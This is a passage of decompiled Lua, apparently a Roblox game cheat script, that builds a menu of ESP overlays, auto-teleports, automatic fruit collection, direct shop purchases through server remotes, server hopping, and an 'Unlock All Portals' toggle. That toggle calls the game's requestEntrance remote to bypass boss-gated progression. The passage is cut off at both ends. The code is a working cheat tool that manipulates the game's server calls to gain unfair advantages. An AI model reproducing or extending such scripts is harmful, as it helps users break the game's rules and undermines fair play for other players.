            LegenSword()
        end
    end)
end
if World2 or World3 then
    v226.Combat:AddToggle("Q", {
        ["Title"] = "Esp Aura Colour Dealers",
        ["Description"] = "",
        ["Default"] = false
    }):OnChanged(function(p1148)
        ColorEsp = p1148
        while ColorEsp do
            wait()
            HakiClorEsp()
        end
    end)
end
if World3 then
    v226.Combat:AddToggle("Q", {
        ["Title"] = "Esp Gears",
        ["Description"] = "",
        ["Default"] = false
    }):OnChanged(function(p1149)
        ESPGear = p1149
        while ESPGear do
            wait()
            gearEsp()
        end
    end)
    v226.Combat:AddToggle("Q", {
        ["Title"] = "Esp SeaEvent Island",
        ["Description"] = "",
        ["Default"] = false
    }):OnChanged(function(p1150)
        EspEventIsland = p1150
        while EspEventIsland do
            wait()
            EventIslandEsp()
        end
    end)
    v226.Combat:AddToggle("Q", {
        ["Title"] = "Esp Advanced Fruits Dealer",
        ["Description"] = "",
        ["Default"] = false
    }):OnChanged(function(p1151)
        advanEsp = p1151
        while advanEsp do
            wait()
            AdvanFruitEsp()
        end
    end)
end
v226.Travel:AddSection("Travel - Worlds")
v226.Travel:AddButton({
    ["Title"] = "Travel East Blue (World 1)",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("TravelMain")
    end
})
v226.Travel:AddButton({
    ["Title"] = "Travel Dressrosa (World 2)",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
    end
})
v226.Travel:AddButton({
    ["Title"] = "Travel Zou (World 3)",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("TravelZou")
    end
})
v226.Travel:AddSection("Travel - Island")
Location = {}
local v1152, v1153, v1154 = pairs(workspace._WorldOrigin.Locations:GetChildren())
while true do
    local v1155
    v1154, v1155 = v1152(v1153, v1154)
    if v1154 == nil then
        break
    end
    table.insert(Location, v1155.Name)
end
Travelllll = v226.Travel:AddDropdown("Travelllll", {
    ["Title"] = "Select Travelling",
    ["Values"] = Location,
    ["Multi"] = false,
    ["Default"] = 1
})
Travelllll:OnChanged(function(p1156)
    _G.Island = p1156
end)
GoIsland = v226.Travel:AddToggle("GoIsland", {
    ["Title"] = "Auto Travel",
    ["Description"] = "Automatic teleport to pos island",
    ["Default"] = false
})
GoIsland:OnChanged(function(p1157)
    _G.Teleport = p1157
    if p1157 then
        local v1158, v1159, v1160 = pairs(workspace._WorldOrigin.Locations:GetChildren())
        while true do
            local v1161
            v1160, v1161 = v1158(v1159, v1160)
            if v1160 == nil then
                break
            end
            if v1161.Name == _G.Island then
                repeat
                    wait()
                    _tp(v1161.CFrame * CFrame.new(0, 30, 0))
                until not _G.Teleport or Root.CFrame == v1161.CFrame
            end
        end
    end
end)
v226.Travel:AddSection("Travel - Portal")
if World1 then
    Location_Portal = {
        "Sky",
        "UnderWater"
    }
elseif World2 then
    Location_Portal = {
        "SwanRoom",
        "Cursed Ship"
    }
elseif World3 then
    Location_Portal = {
        "Castle On The Sea",
        "Mansion Cafe",
        "Hydra Teleport",
        "Canvendish Room",
        "Temple of Time"
    }
end
PortalTP = v226.Travel:AddDropdown("PortalTP", {
    ["Title"] = "Select Portal",
    ["Values"] = Location_Portal,
    ["Multi"] = false,
    ["Default"] = 1
})
PortalTP:OnChanged(function(p1162)
    _G.Island_PT = p1162
end)
v226.Travel:AddButton({
    ["Title"] = "requestEntrance",
    ["Description"] = "",
    ["Callback"] = function()
        if _G.Island_PT ~= "Sky" then
            if _G.Island_PT ~= "UnderWater" then
                if _G.Island_PT ~= "SwanRoom" then
                    if _G.Island_PT ~= "Cursed Ship" then
                        if _G.Island_PT ~= "Castle On The Sea" then
                            if _G.Island_PT ~= "Mansion Cafe" then
                                if _G.Island_PT ~= "Hydra Teleport" then
                                    if _G.Island_PT ~= "Canvendish Room" then
                                        if _G.Island_PT == "Temple of Time" then
                                            replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(28310.0234, 14895.1123, 109.456741, - 0.469690144, - 2.85620132e-8, - 0.882831335, - 3.23509219e-8, 1, - 1.51411736e-8, 0.882831335, 2.14487486e-8, - 0.469690144))
                                        end
                                    else
                                        replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5314.5463867188, 22.562219619751, - 127.06755065918))
                                    end
                                else
                                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5643.4526367188, 1013.0858154297, - 340.51025390625))
                                end
                            else
                                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 12471.169921875, 374.94024658203, - 7551.677734375))
                            end
                        else
                            replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5097.93164, 316.447021, - 3142.66602, - 0.405007899, - 4.31682743e-8, 0.914313197, - 1.90943332e-8, 1, 3.8755779e-8, - 0.914313197, - 1.76180437e-9, - 0.405007899))
                        end
                    else
                        replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923, 126, 32852))
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(2285, 15, 905))
                end
            else
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163, 11, 1819))
            end
        else
            replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 7894, 5547, - 380))
        end
    end
})
v226.Travel:AddSection("Travel - NPCs")
local v1163, v1164, v1165 = pairs(replicated.NPCs:GetChildren())
while true do
    local v1166
    v1165, v1166 = v1163(v1164, v1165)
    if v1165 == nil then
        break
    end
    table.insert(NPCList, v1166.Name)
end
NPCsPos = v226.Travel:AddDropdown("NPCsPos", {
    ["Title"] = "Select NPCs",
    ["Values"] = NPCList,
    ["Multi"] = false,
    ["Default"] = 1
})
NPCsPos:OnChanged(function(p1167)
    NPClist = p1167
end)
GoNPCs = v226.Travel:AddToggle("GoNPCs", {
    ["Title"] = "Auto Tween to NPCs",
    ["Description"] = "Automatic teleport to pos Npcs",
    ["Default"] = false
})
GoNPCs:OnChanged(function(p1168)
    _G.TPNpc = p1168
end)
spawn(function()
    while wait(Sec) do
        if _G.TPNpc then
            pcall(function()
                local v1169, v1170, v1171 = pairs(replicated.NPCs:GetChildren())
                while true do
                    local v1172
                    v1171, v1172 = v1169(v1170, v1171)
                    if v1171 == nil then
                        break
                    end
                    if v1172.Name == NPClist then
                        _tp(v1172.HumanoidRootPart.CFrame)
                    end
                end
            end)
        end
    end
end)
v226.Fruit:AddSection("Fruits Options")
local v1173, v1174, v1175 = pairs(replicated.Remotes.CommF_:InvokeServer("GetFruits", true))
local function v1179(p1176)
    local v1177 = tostring(p1176)
    repeat
        local v1178
        v1177, v1178 = v1177:gsub("^(-?%d+)(%d%d%d)", "%1,%2")
        k = v1178
    until k == 0
    return v1177
end
local v1180 = {}
while true do
    local v1181, v1182 = v1173(v1174, v1175)
    if v1181 == nil then
        break
    end
    v1175 = v1181
    if v1182.OnSale == true then
        v1179(v1182.Price)
        local v1183 = v1182.Name
        table.insert(v1180, v1183)
    end
end
local v1184, v1185, v1186 = pairs(replicated.Remotes.CommF_:InvokeServer("GetFruits", false))
local v1187 = {}
while true do
    local v1188, v1189 = v1184(v1185, v1186)
    if v1188 == nil then
        break
    end
    v1186 = v1188
    if v1189.OnSale == true then
        v1179(v1189.Price)
        local v1190 = v1189.Name
        table.insert(v1187, v1190)
    end
end
Sel_NFruit = v226.Fruit:AddDropdown("Sel_NFruit", {
    ["Title"] = "Select Fruit Stock",
    ["Values"] = v1187,
    ["Multi"] = false,
    ["Default"] = 1
})
Sel_NFruit:OnChanged(function(p1191)
    _G.SelectFruit = p1191
end)
v226.Fruit:AddButton({
    ["Title"] = "Buy Basic Stock",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("PurchaseRawFruit", _G.SelectFruit)
    end
})
Sel_MFruit = v226.Fruit:AddDropdown("Sel_MFruit", {
    ["Title"] = "Select Mirage Fruit",
    ["Values"] = v1180,
    ["Multi"] = false,
    ["Default"] = 1
})
Sel_MFruit:OnChanged(function(p1192)
    SelectF_Adv = p1192
end)
local v1193, v1194, v1195 = pairs(replicated.Remotes.CommF_:InvokeServer("GetFruits", false))
local v1196 = {}
while true do
    local v1197, v1198 = v1193(v1194, v1195)
    if v1197 == nil then
        break
    end
    v1195 = v1197
    if v1198.OnSale == true then
        v1179(v1198.Price)
        local v1199 = v1198.Name
        table.insert(v1196, v1199)
    end
end
v226.Fruit:AddButton({
    ["Title"] = "Buy Mirage Stock",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("PurchaseRawFruit", SelectF_Adv)
    end
})
RandomFF = v226.Fruit:AddToggle("RandomFF", {
    ["Title"] = "Auto Random Fruit",
    ["Description"] = "Automatic random devil fruit",
    ["Default"] = false
})
RandomFF:OnChanged(function(p1200)
    _G.Random_Auto = p1200
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Random_Auto then
                replicated.Remotes.CommF_:InvokeServer("Cousin", "Buy")
            end
        end)
    end
end)
DropF = v226.Fruit:AddToggle("DropF", {
    ["Title"] = "Auto Drop Fruit",
    ["Description"] = "Automatic drop devil fruit",
    ["Default"] = false
})
DropF:OnChanged(function(p1201)
    _G.DropFruit = p1201
end)
spawn(function()
    while wait(Sec) do
        if _G.DropFruit then
            pcall(function()
                DropFruits()
            end)
        end
    end
end)
StoredF = v226.Fruit:AddToggle("StoredF", {
    ["Title"] = "Auto Store Fruit",
    ["Description"] = "Automatic store devil fruit",
    ["Default"] = false
})
StoredF:OnChanged(function(p1202)
    _G.StoreF = p1202
end)
spawn(function()
    while wait(Sec) do
        if _G.StoreF then
            pcall(function()
                UpdStFruit()
            end)
        end
    end
end)
TwF = v226.Fruit:AddToggle("TwF", {
    ["Title"] = "Auto Tween to Fruit",
    ["Description"] = "Automatic tween to get devil fruit",
    ["Default"] = false
})
TwF:OnChanged(function(p1203)
    _G.TwFruits = p1203
end)
spawn(function()
    while wait(Sec) do
        if _G.TwFruits then
            pcall(function()
                local v1204, v1205, v1206 = pairs(workspace:GetChildren())
                while true do
                    local v1207
                    v1206, v1207 = v1204(v1205, v1206)
                    if v1206 == nil then
                        break
                    end
                    if string.find(v1207.Name, "Fruit") then
                        _tp(v1207.Handle.CFrame)
                    end
                end
            end)
        end
    end
end)
BringF = v226.Fruit:AddToggle("BringF", {
    ["Title"] = "Auto Collect Fruit",
    ["Description"] = "Automatic bring devil fruit",
    ["Default"] = false
})
BringF:OnChanged(function(p1208)
    _G.InstanceF = p1208
end)
spawn(function()
    while wait(Sec) do
        if _G.InstanceF then
            pcall(function()
                collectFruits(_G.InstanceF)
            end)
        end
    end
end)
v226.Shop:AddSection("Shop Options")
v226.Shop:AddButton({
    ["Title"] = "Buy Buso",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyHaki", "Buso")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Geppo",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyHaki", "Geppo")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Soru",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyHaki", "Soru")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Ken",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("KenTalk", "Buy")
    end
})
v226.Shop:AddSection("Fighting - Style")
v226.Shop:AddButton({
    ["Title"] = "Buy Black Leg",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyBlackLeg")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Electro",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyElectro")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Fishman Karate",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyFishmanKarate")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy DragonClaw",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Superhuman",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuySuperhuman")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Death Step",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyDeathStep")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Sharkman Karate",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuySharkmanKarate")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy ElectricClaw",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyElectricClaw")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy DragonTalon",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyDragonTalon")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Godhuman",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyGodhuman")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy SanguineArt",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuySanguineArt")
    end
})
v226.Shop:AddSection("Accessory")
v226.Shop:AddButton({
    ["Title"] = "Buy Tomoe Ring",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Tomoe Ring")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Black Cape",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Black Cape")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Swordsman Hat",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Swordsman Hat")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Bizarre Rifle",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 1)
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Ghoul Mask",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 2)
    end
})
v226.Shop:AddSection("Accessory SeaEvent")
v226.Shop:AddButton({
    ["Title"] = "Craft Dragonheart",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Dragonheart")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft Dragonstorm",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "Dragonstorm")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft DinoHood",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "DinoHood")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft SharkTooth",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "SharkTooth")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft TerrorJaw",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "TerrorJaw")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft SharkAnchor",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "SharkAnchor")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft LeviathanCrown",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LeviathanCrown")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft LeviathanShield",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LeviathanShield")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft LeviathanBoat",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LeviathanBoat")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft LegendaryScroll",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "LegendaryScroll")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Craft MythicalScroll",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CraftItem", "Craft", "MythicalScroll")
    end
})
v226.Shop:AddSection("Weapon World1")
v226.Shop:AddButton({
    ["Title"] = "Buy Cutlass",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Cutlass")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Katana",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Katana")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Iron Mace",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Iron Mace")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Duel Katana",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Duel Katana")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Triple Katana",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Triple Katana")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Pipe",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Pipe")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Dual-Headed Blade",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Dual-Headed Blade")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Bisento",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Bisento")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Soul Cane",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Soul Cane")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Slingshot",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Slingshot")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Musket",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Musket")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Dual Flintlock",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Dual Flintlock")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Flintlock",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Flintlock")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Refined Flintlock",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Refined Flintlock")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Cannon",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyItem", "Cannon")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Kabucha",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BlackbeardReward", "Slingshot", "2")
    end
})
v226.Shop:AddSection("Fragments shop")
v226.Shop:AddButton({
    ["Title"] = "Buy Refund Stats",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "2")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Reroll Race",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "2")
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Ghoul Race (2.5k)",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("Ectoplasm", " Change", 4)
    end
})
v226.Shop:AddButton({
    ["Title"] = "Buy Cyborg Race (2.5k)",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("CyborgTrainer", " Buy")
    end
})
v226.Misc:AddSection("Server - Function")
v226.Misc:AddButton({
    ["Title"] = "Rejoin Server",
    ["Description"] = "",
    ["Callback"] = function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
    end
})
v226.Misc:AddButton({
    ["Title"] = "Hop Server",
    ["Description"] = "",
    ["Callback"] = function()
        Hop()
    end
})
v226.Misc:AddButton({
    ["Title"] = "Hop to Lowest Players",
    ["Description"] = "",
    ["Callback"] = function()
        local vu1209 = game:GetService("HttpService")
        local v1210 = game:GetService("TeleportService")
        local v1211 = game.PlaceId
        local vu1212 = "https://games.roblox.com/v1/games/" .. v1211 .. "/servers/Public?sortOrder=Asc&limit=100"
        function ListServers(p1213)
			-- upvalues: (ref) vu1212, (ref) vu1209
            return vu1209:JSONDecode((game:HttpGet(vu1212 .. (p1213 and "&cursor=" .. p1213 or ""))))
        end
        local v1214 = nil
        repeat
            local v1215 = ListServers(v1214)
            local v1216 = v1215.data[1]
            v1214 = v1215.nextPageCursor
        until v1216
        v1210:TeleportToPlaceInstance(v1211, v1216.id, plr)
    end
})
v226.Misc:AddButton({
    ["Title"] = "Hop to Lowest Pings Server",
    ["Description"] = "",
    ["Callback"] = function()
        local vu1217 = game:GetService("HttpService")
        local v1218 = game:GetService("TeleportService")
        local v1219 = game:GetService("Stats")
        local function v1225(p1220, p1221)
			-- upvalues: (ref) vu1217
            local vu1222 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?limit=%d", p1220, p1221)
            local v1223, v1224 = pcall(function()
				-- upvalues: (ref) vu1217, (ref) vu1222
                return vu1217:JSONDecode(game:HttpGet(vu1222))
            end)
            if v1223 and (v1224 and v1224.data) then
                return v1224.data
            else
                return nil
            end
        end
        local v1226 = game.PlaceId
        local v1227 = v1225(v1226, 100)
        if v1227 then
            local v1228 = v1227[1]
            local v1229, v1230, v1231 = pairs(v1227)
            while true do
                local v1232
                v1231, v1232 = v1229(v1230, v1231)
                if v1231 == nil then
                    break
                end
                if v1232.ping < v1228.ping then
                    if v1232.maxPlayers > v1232.playing then
                        v1228 = v1232
                    end
                end
            end
            task.wait(0.5)
            local v1233 = v1219.Network.ServerStatsItem["Data Ping"]:GetValueString()
            if tonumber(v1233:match("(%d+)")) >= 100 then
                v1218:TeleportToPlaceInstance(v1226, v1228.id)
            end
        end
    end
})
v226.Misc:AddInput("JobID", {
    ["Title"] = "JobID",
    ["Default"] = "",
    ["Placeholder"] = "",
    ["Numeric"] = false,
    ["Finished"] = false,
    ["Callback"] = function(p1234)
        _G.JobId = p1234
    end
})
spawn(function()
    while wait(Sec) do
        if _G.JobId then
            pcall(function()
                local vu1235 = nil
                local _ = plr.OnTeleport:Connect(function(p1236)
					-- upvalues: (ref) vu1235
                    if p1236 == Enum.TeleportState.Failed then
                        vu1235:Disconnect()
                        if workspace:FindFirstChild("Message") then
                            workspace.Message:Destroy()
                        end
                    end
                end)
            end)
        end
    end
end)
v226.Misc:AddButton({
    ["Title"] = "Teleport [Job ID]",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.__ServerBrowser:InvokeServer("teleport", _G.JobId)
    end
})
v226.Misc:AddButton({
    ["Title"] = "Copy JobID",
    ["Description"] = "",
    ["Callback"] = function()
        setclipboard(tostring(game.JobId))
    end
})
v226.Misc:AddSection("Player Gui / Others")
v226.Misc:AddButton({
    ["Title"] = "Open Awakenings Expert",
    ["Description"] = "",
    ["Callback"] = function()
        plr.PlayerGui.Main.AwakeningToggler.Visible = true
    end
})
v226.Misc:AddButton({
    ["Title"] = "Open Title Selection",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("getTitles", true)
        plr.PlayerGui.Main.Titles.Visible = true
    end
})
DisbleChat = v226.Misc:AddToggle("DisbleChat", {
    ["Title"] = "Disable Chat GUI",
    ["Description"] = "",
    ["Default"] = false
})
DisbleChat:OnChanged(function(p1237)
    _G.Rechat = p1237
    if _G.Rechat ~= true then
        if _G.chat == false then
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
        end
    else
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    end
end)
DisbleLeaderB = v226.Misc:AddToggle("DisbleLeaderB", {
    ["Title"] = "Disable Leader Board GUI",
    ["Description"] = "",
    ["Default"] = false
})
DisbleLeaderB:OnChanged(function(p1238)
    ReLeader = p1238
    if ReLeader ~= true then
        if ReLeader == false then
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
        end
    else
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    end
end)
v226.Misc:AddButton({
    ["Title"] = "Set Pirate Team",
    ["Description"] = "",
    ["Callback"] = function()
        Pirates()
    end
})
v226.Misc:AddButton({
    ["Title"] = "Set Marine Team",
    ["Description"] = "",
    ["Callback"] = function()
        Marines()
    end
})
UnPortal = v226.Misc:AddToggle("UnPortal", {
    ["Title"] = "Unlock All Portals",
    ["Description"] = "unlocked portal for who doesn\'t defeat rip_indra",
    ["Default"] = false
})
UnPortal:OnChanged(function(p1239)
    _G.PortalUnLock = p1239
end)
spawn(function()
	-- upvalues: (ref) vu999
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu999
            if _G.PortalUnLock then
                if vu999.Pos(CstlePos_Miti, 8) then
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 12471.169921875, 374.94024658203, - 7551.677734375))
                elseif vu999.Pos(Man3Pos_Miti, 8) then
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5072.08984375, 314.5412902832, - 3151.1098632812))
                elseif vu999.Pos(HydraPos_Miti, 8) then
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5748.7587890625, 610.44982910156, - 267.81704711914))
                elseif vu999.Pos(HydratoCastle, 8) then
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5072.08984375, 314.5412902832, - 3151.1098632812))
                end
            end
        end)
    end
end)
v226.Misc:AddSection("Graphics / Haki Stats")
HakiSt = {
    "State 0",
    "State 1",
    "State 2",
    "State 3",
    "State 4",
    "State 5"
}
HakiStat = v226.Misc:AddDropdown("HakiStat", {
    ["Title"] = "Select Haki States",
    ["Values"] = HakiSt,
    ["Multi"] = false,
    ["Default"] = 1
})
HakiStat:OnChanged(function(p1240)
    _G.SelectStateHaki = p1240
end)
v226.Misc:AddButton({
    ["Title"] = "ChangeBusoStage",
    ["Description"] = "",
    ["Callback"] = function()
        if _G.SelectStateHaki ~= "State 0" then
            if _G.SelectStateHaki ~= "State 1" then
                if _G.SelectStateHaki ~= "State 2" then
                    if _G.SelectStateHaki ~= "State 3" then
                        if _G.SelectStateHaki ~= "State 4" then
                            if _G.SelectStateHaki == "State 5" then
                                replicated.Remotes.CommF_:InvokeServer("ChangeBusoStage", 5)
                            end
                        else
                            replicated.Remotes.CommF_:InvokeServer("ChangeBusoStage", 4)
                        end
                    else
                        replicated.Remotes.CommF_:InvokeServer("ChangeBusoStage", 3)
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("ChangeBusoStage", 2)
                end
            else
                replicated.Remotes.CommF_:InvokeServer("ChangeBusoStage", 1)
            end
        else
            replicated.Remotes.CommF_:InvokeServer("ChangeBusoStage", 0)
        end
    end
})
rtxM = v226.Misc:AddToggle("rtxM", {
    ["Title"] = "Turn on RTX Mode",
    ["Description"] = "",
    ["Default"] = false
})
rtxM:OnChanged(function(p1241)
    _G.RTXMode = p1241
    local v1242 = game.Lighting
    local v1243 = Instance.new("ColorCorrectionEffect", v1242)
    local v1244 = Instance.new("ColorCorrectionEffect", v1242)
    OldAmbient = v1242.Ambient
    OldBrightness = v1242.Brightness
    OldColorShift_Top = v1242.ColorShift_Top
    OldBrightnessc = v1243.Brightness
    OldContrastc = v1243.Contrast
    OldTintColorc = v1243.TintColor
    OldTintColore = v1244.TintColor
    if _G.RTXMode then
        while _G.RTXMode do
            wait()
            v1242.Ambient = Color3.fromRGB(33, 33, 33)
            v1242.Brightness = 0.3
            v1243.Brightness = 0.176
            v1243.Contrast = 0.39
            v1243.TintColor = Color3.fromRGB(217, 145, 57)
            game.Lighting.FogEnd = 999
            if not plr.Character.HumanoidRootPart:FindFirstChild("PointLight") then
                local v1245 = Instance.new("PointLight")
                v1245.Parent = plr.Character.HumanoidRootPart
                v1245.Range = 15
                v1245.Color = Color3.fromRGB(217, 145, 57)
            end
            if not _G.RTXMode then
                v1242.Ambient = OldAmbient
                v1242.Brightness = OldBrightness
                v1242.ColorShift_Top = OldColorShift_Top
                v1243.Contrast = OldContrastc
                v1243.Brightness = OldBrightnessc
                v1243.TintColor = OldTintColorc
